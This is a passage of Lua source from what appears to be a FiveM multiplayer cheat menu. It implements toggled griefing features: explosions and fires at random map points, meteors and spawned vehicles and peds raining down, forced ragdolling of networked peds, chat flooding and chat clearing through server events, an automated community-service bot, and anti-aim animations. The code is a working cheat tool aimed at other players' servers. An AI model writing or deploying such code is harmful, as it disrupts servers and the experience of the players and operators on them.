                        if __REAPER1__.N.IsDisabledControlPressed(0, 89) and __REAPER1__.N.IsDisabledControlPressed(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 13, 1)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 90) and __REAPER1__.N.IsDisabledControlPressed(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 14, 1)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 129) and __REAPER1__.N.IsDisabledControlPressed(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 30, 100)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 89) and __REAPER1__.N.IsDisabledControlPressed(0, 129) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 7, 1)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 90) and __REAPER1__.N.IsDisabledControlPressed(0, 129) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 8, 1)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 89) and not __REAPER1__.N.IsDisabledControlPressed(0, 129) and not __REAPER1__.N.IsDisabledControlPressed(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 4, 1)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 90) and not __REAPER1__.N.IsDisabledControlPressed(0, 129) and not __REAPER1__.N.IsDisabledControlPressed(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 5, 1)
                        end

                        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.Rcbandito)
                        __REAPER1__.N.BadabingBadaboom(coords.x, coords.y)
                    else
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.Rcbandito)
                        __REAPER1__.N.RcCam(false)
                        __REAPER1__.M.misc.rccar.blade(nil, __REAPER1__.A['misc:rccar_blade'].func)
                        __REAPER1__.F.AddNotification('Can\'t RC car on this server.', 5000, 210, 210, 0)
                    end
                end

                if __REAPER1__.A['misc:rccar_blade'].func and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcblade) then
                    if __REAPER1__.V.RcrotorToggle then
                        __REAPER1__.N.SetHeliBladesSpeed(__REAPER1__.V.Rcblade, 1.0)
                    end
                    if __REAPER1__.A['misc:rccar_rotorkey'].toggle and __REAPER1__.N.IsDisabledControlJustPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['misc:rccar_rotorkey'].func[__REAPER1__.A['misc:rccar_rotorkey'].sindex]]) then
                        __REAPER1__.V.RcrotorToggle = not __REAPER1__.V.RcrotorToggle
                        __REAPER1__.N.SetHeliBladesSpeed(__REAPER1__.V.Rcblade, 0.0)
                    end
                end

                if __REAPER1__.A['misc:rccar_explosion'].func and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) and __REAPER1__.N.IsDisabledControlJustPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['misc:rccar_explosionkey'].func[__REAPER1__.A['misc:rccar_explosionkey'].sindex]]) then
                    local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.Rcbandito)
                    __REAPER1__.N.CreateExplosion(coords.x, coords.y, coords.z + 0.5, __REAPER1__.A['misc:rccar_type'].sindex - 1, 9999.0, __REAPER1__.A['misc:rccar_audible'].func, __REAPER1__.A['misc:rccar_invisible'].func, 0)
                end

                if __REAPER1__.A['misc:rccar_blip'].func and __REAPER1__.N.DoesBlipExist(__REAPER1__.V.RccarBlip) then
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) then
                        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.Rcbandito)
                        __REAPER1__.N.BeginTextCommandSetBlipName('STRING')
                        __REAPER1__.N.AddTextComponentSubstringPlayerName('~r~~h~Rc bandito')
                        __REAPER1__.N.EndTextCommandSetBlipName(__REAPER1__.V.RccarBlip)
                        __REAPER1__.N.SetBlipCoords(__REAPER1__.V.RccarBlip, coords)
                        __REAPER1__.N.SetBlipRotation(__REAPER1__.V.RccarBlip, math.ceil(__REAPER1__.N.GetEntityRotation(__REAPER1__.V.Rcbandito)[3]))
                    else
                        __REAPER1__.N.RemoveBlip(__REAPER1__.V.RccarBlip)
                        __REAPER1__.V.RccarBlip = nil
                    end
                end

                if __REAPER1__.A['combat:crosshair_crosshair'].toggle and (__REAPER1__.A['combat:crosshair_crosshair'].sindex == 1 or __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId)) then
                    local r, g, b, a = __REAPER1__.F.Color('combat:crosshair_colortype', 'combat:crosshair_color')
                    __REAPER1__.F.DrawCrosshair('p', __REAPER1__.A['combat:crosshair_type'].sindex, r, g, b, a)
                end

            if __REAPER1__.A['combat:crosshair_scrosshair'].toggle and (__REAPER1__.A['combat:crosshair_scrosshair'].sindex == 1 or __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId)) then
                local r, g, b, a = __REAPER1__.F.Color('combat:crosshair_scolortype', 'combat:crosshair_scolor')
                __REAPER1__.F.DrawCrosshair('s', __REAPER1__.A['combat:crosshair_stype'].sindex, r, g, b, a)
            end

                if __REAPER1__.A['misc:hudelements_1'].toggle then __REAPER1__.N.HudComp('misc:hudelements_1', 1) end
                if __REAPER1__.A['misc:hudelements_2'].toggle then __REAPER1__.N.HudComp('misc:hudelements_2', 2) end
                if __REAPER1__.A['misc:hudelements_3'].toggle then __REAPER1__.N.HudComp('misc:hudelements_3', 3) end
                if __REAPER1__.A['misc:hudelements_4'].toggle then __REAPER1__.N.HudComp('misc:hudelements_4', 4) end
                if __REAPER1__.A['misc:hudelements_5'].toggle then __REAPER1__.N.HudComp('misc:hudelements_5', 5) end
                if __REAPER1__.A['misc:hudelements_6'].toggle then __REAPER1__.N.HudComp('misc:hudelements_6', 6) end
                if __REAPER1__.A['misc:hudelements_7'].toggle then __REAPER1__.N.HudComp('misc:hudelements_7', 7) end
                if __REAPER1__.A['misc:hudelements_8'].toggle then __REAPER1__.N.HudComp('misc:hudelements_8', 8) end
                if __REAPER1__.A['misc:hudelements_9'].toggle then __REAPER1__.N.HudComp('misc:hudelements_9', 9) end
                if __REAPER1__.A['misc:hudelements_10'].toggle then __REAPER1__.N.HudComp('misc:hudelements_10', 10) end
                if __REAPER1__.A['misc:hudelements_11'].toggle then __REAPER1__.N.HudComp('misc:hudelements_11', 11) end
                if __REAPER1__.A['misc:hudelements_12'].toggle then __REAPER1__.N.HudComp('misc:hudelements_12', 12) end
                if __REAPER1__.A['misc:hudelements_13'].toggle then __REAPER1__.N.HudComp('misc:hudelements_13', 13) end
                if __REAPER1__.A['misc:hudelements_14'].toggle then __REAPER1__.N.HudComp('misc:hudelements_14', 14) end
                if __REAPER1__.A['misc:hudelements_15'].toggle then __REAPER1__.N.HudComp('misc:hudelements_15', 15) end
                if __REAPER1__.A['misc:hudelements_16'].toggle then __REAPER1__.N.HudComp('misc:hudelements_16', 16) end
                if __REAPER1__.A['misc:hudelements_17'].toggle then __REAPER1__.N.HudComp('misc:hudelements_17', 17) end
                if __REAPER1__.A['misc:hudelements_18'].toggle then __REAPER1__.N.HudComp('misc:hudelements_18', 18) end
                if __REAPER1__.A['misc:hudelements_19'].toggle then __REAPER1__.N.HudComp('misc:hudelements_19', 19) end
                if __REAPER1__.A['misc:hudelements_20'].toggle then __REAPER1__.N.HudComp('misc:hudelements_20', 20) end
                if __REAPER1__.A['misc:hudelements_21'].toggle then __REAPER1__.N.HudComp('misc:hudelements_21', 21) end
                if __REAPER1__.A['misc:hudelements_22'].toggle then __REAPER1__.N.HudComp('misc:hudelements_22', 22) end

                if __REAPER1__.A['misc:k9unit_blip'].func and __REAPER1__.N.DoesBlipExist(__REAPER1__.V.k9Blip) then
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.K9) then
                        local coords = __REAPER1__.N.GetEntityCoords(__REAPER1__.V.K9)
                        __REAPER1__.N.BeginTextCommandSetBlipName('STRING')
                        __REAPER1__.N.AddTextComponentSubstringPlayerName('~b~~h~K9 unit')
                        __REAPER1__.N.EndTextCommandSetBlipName(__REAPER1__.V.k9Blip)
                        __REAPER1__.N.SetBlipCoords(__REAPER1__.V.k9Blip, coords)
                        __REAPER1__.N.SetBlipRotation(__REAPER1__.V.k9Blip, math.ceil(__REAPER1__.N.GetEntityRotation(__REAPER1__.V.K9)[3]))
                    else
                        __REAPER1__.N.RemoveBlip(__REAPER1__.V.k9Blip)
                        __REAPER1__.V.k9Blip = nil
                    end
                end

                if __REAPER1__.A['misc:controls_enableall'].func then
                    __REAPER1__.N.EnableAllControlActions(0)
                    __REAPER1__.N.EnableAllControlActions(1)
                    __REAPER1__.N.EnableAllControlActions(2)
                end

                if __REAPER1__.A['misc:controls_disableall'].func then
                    __REAPER1__.N.DisableAllControlActions(0)
                    __REAPER1__.N.DisableAllControlActions(1)
                    __REAPER1__.N.DisableAllControlActions(2)
                end

                if __REAPER1__.A['misc:controls_loop'].func then
                    __REAPER1__.M.misc.controls.imitate(nil, __REAPER1__.A['misc:controls_force'].func, nil, __REAPER1__.A['misc:controls_force'].sindex)
                end

                if __REAPER1__.A['misc:controls_enable'].toggle then
                    __REAPER1__.N.EnableControlAction(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['misc:controls_enable'].func[__REAPER1__.A['misc:controls_enable'].sindex]], true)
                end

                if __REAPER1__.A['misc:controls_disable'].toggle then
                    __REAPER1__.N.DisableControlAction(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['misc:controls_disable'].func[__REAPER1__.A['misc:controls_disable'].sindex]], true)
                end

                if __REAPER1__.A['misc:controls_iloop'].func then
                    __REAPER1__.M.misc.controls.iimitate(nil, __REAPER1__.A['misc:controls_iforce'].func, nil, __REAPER1__.A['misc:controls_iforce'].sindex)
                end

                if __REAPER1__.A['misc:controls_ienable'].toggle then
                    __REAPER1__.N.EnableControlAction(0, __REAPER1__.A['misc:controls_ienable'].sindex, true)
                end

                if __REAPER1__.A['misc:controls_idisable'].toggle then
                    __REAPER1__.N.DisableControlAction(0, __REAPER1__.A['misc:controls_idisable'].sindex, true)
                end

                if __REAPER1__.A['world_meteorshower'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldMeteorWait or 0) and __REAPER1__.N.HasModelLoaded(`prop_asteroid_01`) then
                    __REAPER1__.V.WorldMeteorWait = __REAPER1__.N.GetGameTimer() + 300
                    local x, y, z = __REAPER1__.F.RandomCoords()
                    if x and y and z then
                        local obj = __REAPER1__.N.CreateObject(`prop_asteroid_01`, x, y, z + 100, true, true, false)
                        __REAPER1__.N.ApplyForceToEntity(obj, 1, 0.0, 3.0, -100.0, -1.0, 0.0, 0.0, 1, false, true, false, false)
                        __REAPER1__.N.ApplyForceToEntity(obj, 1, 0.0, 3.0, -100.0, -1.0, 0.0, 0.0, 1, false, true, false, false)
                    end
                end

                if __REAPER1__.A['world_rain'].toggle and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldRainWait or 0) then
                    __REAPER25__(function()
                        __REAPER1__.V.WorldRainWait = __REAPER1__.N.GetGameTimer() + 200
                        local x, y, z = __REAPER1__.F.RandomCoords()
                        local ent = __REAPER1__.T.Freecam[__REAPER1__.A['world_rain'].sindex + 1].tablem[math.random(2, #__REAPER1__.T.Freecam[__REAPER1__.A['world_rain'].sindex + 1].tablem)].key
                        if x and y and z and __REAPER1__.F.RequestEntity(ent) then
                            if __REAPER1__.A['world_rain'].sindex == 1 then
                                __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType(ent), ent, x, y, z + 100, 0, true, true)
                            else
                                __REAPER1__.N.CreateVehicle(ent, x, y, z + 100, 0, true, true)
                            end
                        end
                    end)
                end

                if __REAPER1__.A['world_objectjunk'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldObjWait or 0) then
                    __REAPER25__(function()
                        __REAPER1__.V.WorldObjWait = __REAPER1__.N.GetGameTimer() + 200
                        local x, y, z = __REAPER1__.F.RandomCoords()
                        local ent = __REAPER1__.T.Freecam[4].tablem[math.random(2, #__REAPER1__.T.Freecam[4].tablem)].key
                        if x and y and z and __REAPER1__.F.RequestEntity(ent) then
                            __REAPER1__.N.CreateObject(ent, x, y, z, true, true, false)
                        end
                    end)
                end

                if __REAPER1__.A['world_pedjunk'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldPedWait or 0) then
                    __REAPER25__(function()
                        __REAPER1__.V.WorldPedWait = __REAPER1__.N.GetGameTimer() + 200
                        local x, y, z = __REAPER1__.F.RandomCoords()
                        local ent = __REAPER1__.T.Freecam[2].tablem[math.random(2, #__REAPER1__.T.Freecam[2].tablem)].key
                        if x and y and z and __REAPER1__.F.RequestEntity(ent) then
                            __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType(ent), ent, x, y, z, 0, true, true)
                        end
                    end)
                end

                if __REAPER1__.A['world_vehiclejunk'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldVehWait or 0) then
                    __REAPER25__(function()
                        __REAPER1__.V.WorldVehWait = __REAPER1__.N.GetGameTimer() + 200
                        local x, y, z = __REAPER1__.F.RandomCoords()
                        local ent = __REAPER1__.T.Freecam[3].tablem[math.random(2, #__REAPER1__.T.Freecam[3].tablem)].key
                        if x and y and z and __REAPER1__.F.RequestEntity(ent) then
                            __REAPER1__.N.CreateVehicle(ent, x, y, z, 0, true, true)
                        end
                    end)
                end

                if __REAPER1__.A['world_explodeworld'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldExpWait or 0) then
                    __REAPER1__.V.WorldExpWait = __REAPER1__.N.GetGameTimer() + 100
                    local x, y, z = __REAPER1__.F.RandomCoords()
                    if x and y and z then
                        __REAPER1__.N.CreateExplosion(x, y, z, 7, 500.0, true, false, 1.0)
                    end
                end

                if __REAPER1__.A['world_burnworld'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldBrnWait or 0) then
                    __REAPER1__.V.WorldBrnWait = __REAPER1__.N.GetGameTimer() + 100
                    local x, y, z = __REAPER1__.F.RandomCoords()
                    if x and y and z then
                        __REAPER1__.N.DoParticle('core', 'ent_sht_petrol_fire', x, y, z, 10.0, 0, 0, 0, 0, 0, 0)
                    end
                end

                if __REAPER1__.A['world_peddensity'].toggle then
                    __REAPER1__.N.SetPedDensityMultiplierThisFrame(__REAPER1__.A['world_peddensity'].func[__REAPER1__.A['world_peddensity'].sindex])
                end

                if __REAPER1__.A['world_speddensity'].toggle then
                    __REAPER1__.N.SetScenarioPedDensityMultiplierThisFrame(__REAPER1__.A['world_peddensity'].func[__REAPER1__.A['world_peddensity'].sindex], __REAPER1__.A['world_peddensity'].func[__REAPER1__.A['world_peddensity'].sindex])
                end

                if __REAPER1__.A['world_vehicledensity'].toggle then
                    __REAPER1__.N.SetPedDensityMultiplierThisFrame(__REAPER1__.A['world_vehicledensity'].func[__REAPER1__.A['world_vehicledensity'].sindex])
                end

                if __REAPER1__.A['world_rvehicledensity'].toggle then
                    __REAPER1__.N.SetRandomVehicleDensityMultiplierThisFrame(__REAPER1__.A['world_rvehicledensity'].func[__REAPER1__.A['world_rvehicledensity'].sindex])
                end

                if __REAPER1__.A['world_pvehicledensity'].toggle then
                    __REAPER1__.N.SetParkedVehicleDensityMultiplierThisFrame(__REAPER1__.A['world_pvehicledensity'].func[__REAPER1__.A['world_pvehicledensity'].sindex])
                end

                if __REAPER1__.A['world_randomweather'].func then
                    if __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.WorldRandomW or 0) then
                        __REAPER1__.V.WorldRandomW = __REAPER1__.N.GetGameTimer() + 50000

                        __REAPER1__.V.WorldRandomWW = string.upper(__REAPER1__.A['world_weather'].func[math.random(1, #__REAPER1__.A['world_weather'].func)])
                    end

                    __REAPER1__.N.SetWeatherTypePersist(__REAPER1__.V.WorldRandomWW)
                    __REAPER1__.N.SetWeatherTypeNow(__REAPER1__.V.WorldRandomWW)
                    __REAPER1__.N.SetWeatherTypeNowPersist(__REAPER1__.V.WorldRandomWW)
                end

                if __REAPER1__.A['world_snow'].func then
                    __REAPER1__.N.ForceSnowPass(true)
                    __REAPER1__.N.SetForceVehicleTrails(true)
                    __REAPER1__.N.SetForcePedFootstepsTracks(true)
                end

                if __REAPER1__.A['world_weather'].toggle then
                    local w = string.upper(__REAPER1__.A['world_weather'].func[__REAPER1__.A['world_weather'].sindex])
                    __REAPER1__.N.SetWeatherTypePersist(w)
                    __REAPER1__.N.SetWeatherTypeNow(w)
                    __REAPER1__.N.SetWeatherTypeNowPersist(w)
                end

                if __REAPER1__.A['world:alwayslit_alwayslit'].func then
                    local coords = __REAPER1__.A['misc:freecam_freecam'].func and __REAPER1__.V.FreecamC or __REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed)
                    local r, g, b = __REAPER1__.F.Color('world:alwayslit_colortype', 'world:alwayslit_color')
                    local power, shadows = __REAPER1__.F.IntToFloat(__REAPER1__.A['world:alwayslit_power'].sindex) / 20, __REAPER1__.F.IntToFloat(__REAPER1__.A['world:alwayslit_shadows'].sindex)
                    
                    __REAPER1__.N.Glow(coords.x, coords.y, coords.z + 160.0, 0.0, 0.0, - 1000.0, r, g, b, 1000.0, power, shadows, 1000.0, 0.0)
                    __REAPER1__.N.Glow(coords.x, coords.y, coords.z - 160.0, 0.0, 0.0, 1000.0, r, g, b, 1000.0, power, shadows, 1000.0, 0.0)
                    __REAPER1__.N.Glow(coords.x, coords.y, coords.z + 160.0, 0.0, 0.0, - 1000.0, r, g, b, 3500.0, power, shadows, 3500.0, 0.0)
                    __REAPER1__.N.Glow(coords.x, coords.y, coords.z - 160.0, 0.0, 0.0, 1000.0, r, g, b, 3500.0, power, shadows, 3500.0, 0.0)
                end

                if __REAPER1__.A['world:time_freezetime'].func then
                    __REAPER1__.N.NetworkOverrideClockTime(__REAPER1__.V.ClockH, __REAPER1__.V.ClockM, __REAPER1__.V.ClockS)
                end

                if __REAPER1__.A['world:time_clearclock'].func then
                    __REAPER1__.N.NetworkClearClockTimeOverride()
                end

                if __REAPER1__.A['world:time_second'].toggle then
                    __REAPER1__.N.NetworkOverrideClockTime(__REAPER1__.N.GetClockHours(), __REAPER1__.N.GetClockMinutes(), __REAPER1__.A['world:time_second'].sindex - 1)
                end

                if __REAPER1__.A['world:time_minute'].toggle then
                    __REAPER1__.N.NetworkOverrideClockTime(__REAPER1__.N.GetClockHours(), __REAPER1__.A['world:time_minute'].sindex - 1, __REAPER1__.N.GetClockSeconds())
                end

                if __REAPER1__.A['world:time_hour'].toggle then
                    __REAPER1__.N.NetworkOverrideClockTime(__REAPER1__.A['world:time_hour'].sindex - 1, __REAPER1__.N.GetClockMinutes(), __REAPER1__.N.GetClockSeconds())
                end

                if __REAPER1__.A['world:blackmagic_blackhole'].func then
                    if __REAPER1__.A['world:blackmagic_positionkey'].toggle and __REAPER1__.N.IsDisabledControlPressed(0, __REAPER1__.T.ControlsPlain[__REAPER1__.A['world:blackmagic_positionkey'].func[__REAPER1__.A['world:blackmagic_positionkey'].sindex]]) then
                        __REAPER1__.V.BlackholePos = __REAPER1__.N.GetFinalRenderedCamCoord() + (__REAPER1__.M.RotationToDirection(__REAPER1__.N.GetFinalRenderedCamRot(2)) * 20)
                    end
                    
                    if __REAPER1__.A['world:blackmagic_indicator'].func then
                        local size = __REAPER1__.F.IntToFloat(__REAPER1__.A['world:blackmagic_strength'].sindex) / 10
                        local r, g, b, a = __REAPER1__.F.TableToColor(__REAPER1__.A['world:blackmagic_color'].menuextra)
                        __REAPER1__.N.DrawMarker(28, __REAPER1__.V.BlackholePos, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, size, size, size, r, g, b, a, false, true, 2, nil, nil, false)
                    end
                end

                if __REAPER1__.A['combat_antiaim'].toggle and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.AntiAimTime or 0) and not __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed) and (not __REAPER1__.A['combat_exception'].toggle or (__REAPER1__.A['combat_exception'].sindex == 1 and __REAPER1__.N.IsPlayerFreeAiming(__REAPER1__.V.SelfPlayerId) or __REAPER1__.A['combat_exception'].sindex == 2 and __REAPER1__.N.IsPedShooting(__REAPER1__.V.SelfPed) or __REAPER1__.A['combat_exception'].sindex == 3 and (__REAPER1__.N.IsPedSprinting(__REAPER1__.V.SelfPed) or __REAPER1__.N.IsPedRunning(__REAPER1__.V.SelfPed)))) then
                    __REAPER25__(function()
                        __REAPER1__.N.ClearPedTasks(__REAPER1__.V.SelfPed, true)
                        local anim = __REAPER1__.A['combat_antiaim'].sindex == 1 and __REAPER1__.T.AntiAim[math.random(1, #__REAPER1__.A['combat_antiaim'].func - 1)] or __REAPER1__.T.AntiAim[__REAPER1__.A['combat_antiaim'].sindex - 1]
                        if __REAPER1__.F.RequestAnimDict(anim.dict) then
                            __REAPER1__.N.TaskPlayAnim(__REAPER1__.V.SelfPed, anim.dict, anim.anim, 0, 16.0, -1, 46, 1.0, false, false, false)
                            __REAPER1__.V.AntiAimTime = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A['combat_untilfinished'].func and anim.wait or 500)
                        end
                    end)
                end

                if __REAPER1__.A['world_everything'].func then
                    __REAPER1__.N.ClearAreaOfEverything(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['world_radius'].sindex))
                end

                if __REAPER1__.A['world_projectiles'].func then
                    __REAPER1__.N.ClearAreaOfProjectiles(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['world_radius'].sindex))
                end

                if __REAPER1__.A['world_objects'].func then
                    __REAPER1__.N.ClearAreaOfObjects(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['world_radius'].sindex), 0)
                end

                if __REAPER1__.A['world_peds'].func then
                    __REAPER1__.N.ClearAreaOfPeds(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['world_radius'].sindex), 1)
                end

                if __REAPER1__.A['world_cops'].func then
                    __REAPER1__.N.ClearAreaOfCops(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['world_radius'].sindex), 0)
                end

                if __REAPER1__.A['world_vehicles'].func then
                    __REAPER1__.N.ClearAreaOfVehicles(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed), __REAPER1__.F.IntToFloat(__REAPER1__.A['world_radius'].sindex))
                end

                if __REAPER1__.A['world:hover:ped_ragdoll'].func then
                    __REAPER1__.N.SetPedToRagdoll(__REAPER1__.V.HoverEnt, 1000, 1000, 0, 0, 0, 0)
                end

                if __REAPER1__.A['world:peds_ragdoll'].func then
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                __REAPER1__.N.SetPedToRagdoll(v, 1000, 1000, 0, 0, 0, 0)
                            end

                            __REAPER26__(5)
                        end
                    end)
                end

                if __REAPER1__.A['world:peds_particle'].toggle then
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GameTable('CPed')) do
                            if not __REAPER1__.N.IsPedAPlayer(v) and __REAPER1__.F.NetControl(v) then
                                local coords = __REAPER1__.N.GetEntityCoords(v)
                                __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleEffects[__REAPER1__.A['world:peds_particle'].sindex].dict, __REAPER1__.T.ParticleEffects[__REAPER1__.A['world:peds_particle'].sindex].name, coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                            end

                            __REAPER26__(5)
                        end
                    end)
                end

                if __REAPER1__.A['scripts_floodchat'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.ChatDelay or 0) then
                    __REAPER1__.V.ChatDelay = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['scripts_delay'].sindex
                    __REAPER1__.M.scripts.sendmsg()
                end


                if __REAPER1__.A['scripts_chatclear'].func and __REAPER1__.V.TriggerChat and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.ChatDelay or 0) then
                    __REAPER1__.V.ChatDelay = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['scripts_delay'].sindex
                    __REAPER1__.N.TriggerServerEvent(__REAPER1__.V.TriggerChat, ' ', {255, 255, 255}, '\n\n\n\n\n\n\n\n\n\n\n???\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n???\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n???\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n???\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
                end

                if __REAPER1__.A['scripts:bots_commservbot'].func and (not __REAPER1__.A['scripts:bots_delayaf'].toggle or __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.CommDelayAfter or 0)) then
                    if (__REAPER1__.V.CommServStrikes or 0) <= __REAPER1__.A['scripts:bots_amounttodo'].sindex then

                        if __REAPER1__.A['scripts:bots_delaybef'].toggle and not __REAPER1__.V.CommDelayBefore then
                            __REAPER1__.V.CommDelayBefore = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['scripts:bots_delaybef'].sindex * 1000
                        end

                        if not __REAPER1__.A['scripts:bots_delaybef'].toggle or __REAPER1__.N.GetGameTimer() >= __REAPER1__.V.CommDelayBefore then
                            if not __REAPER1__.V.CommServCoord then
                                __REAPER25__(function()
                                    local rc = __REAPER1__.T.CommServLocs[math.random(1, #__REAPER1__.T.CommServLocs)].coords
                                    while rc == __REAPER1__.V.CommServCoord do
                                        __REAPER26__(0)
                                        rc = __REAPER1__.T.CommServLocs[math.random(1, #__REAPER1__.T.CommServLocs)].coords
                                    end
                                    __REAPER1__.V.CommServCoord = rc
                                    __REAPER1__.N.TaskGoStraightToCoord(__REAPER1__.V.SelfPed, __REAPER1__.V.CommServCoord, 20.0, -1, 0.0, 1.0)
                                end)
                            elseif #(__REAPER1__.N.GetEntityCoords(__REAPER1__.V.SelfPed) - __REAPER1__.V.CommServCoord) < 1.5 and __REAPER1__.V.UpdatedCommCoords ~= __REAPER1__.V.CommServCoord then
                                __REAPER25__(function()
                                    __REAPER1__.N.SetControlNormal(0, 38, 1.0)

                                    while __REAPER1__.N.IsEntityPlayingAnim(__REAPER1__.V.SelfPed, "amb@world_human_janitor@male@idle_a", "idle_a", 3) or __REAPER1__.N.IsPedUsingScenario("world_human_gardener_plant") do
                                        __REAPER26__(0)
                                        if __REAPER1__.V.UpdatedCommCoords ~= __REAPER1__.V.CommServCoord then
                                            __REAPER1__.V.UpdatedCommCoords = __REAPER1__.V.CommServCoord
                                        end
                                    end

                                    if __REAPER1__.V.UpdatedCommCoords == __REAPER1__.V.CommServCoord then
                                        __REAPER1__.V.CommServStrikes = __REAPER1__.V.CommServStrikes + 1
                                        __REAPER1__.V.CommServCoord = nil
                                        if __REAPER1__.A['scripts:bots_delayaf'].toggle then
                                            __REAPER1__.V.CommDelayAfter = __REAPER1__.N.GetGameTimer() + __REAPER1__.A['scripts:bots_delayaf'].sindex * 1000
                                        end
                                    end
                                end)
                            end
                        end
                    elseif __REAPER1__.A['scripts:bots_disconnect'].func then
                        for i = 1, 100 do
                            __REAPER1__.N.TriggerServerEvent('__REAPER1__')
                        end
                    elseif __REAPER1__.A['scripts:bots_quit'].func then
                        __REAPER1__.N.RestartGame()
                    elseif __REAPER1__.A['scripts:bots_crash'].func then
                        __REAPER1__.N.DeleteEntity(__REAPER1__.V.SelfPed)
                    end
                end

                if __REAPER1__.A['vehicle:movement_drivetowaypoint'].func and __REAPER1__.N.IsPedInAnyVehicle(__REAPER1__.V.SelfPed) then
                    local waypoint = __REAPER1__.N.GetFirstBlipInfoId(8)
                    local ex = __REAPER1__.N.DoesBlipExist(waypoint)
                    if ex and not __REAPER1__.V.DrivingToWp then
                        __REAPER1__.V.DrivingToWp = __REAPER1__.N.GetBlipInfoIdCoord(waypoint)
                        local veh = __REAPER1__.N.GetVehiclePedIsIn(__REAPER1__.V.SelfPed)
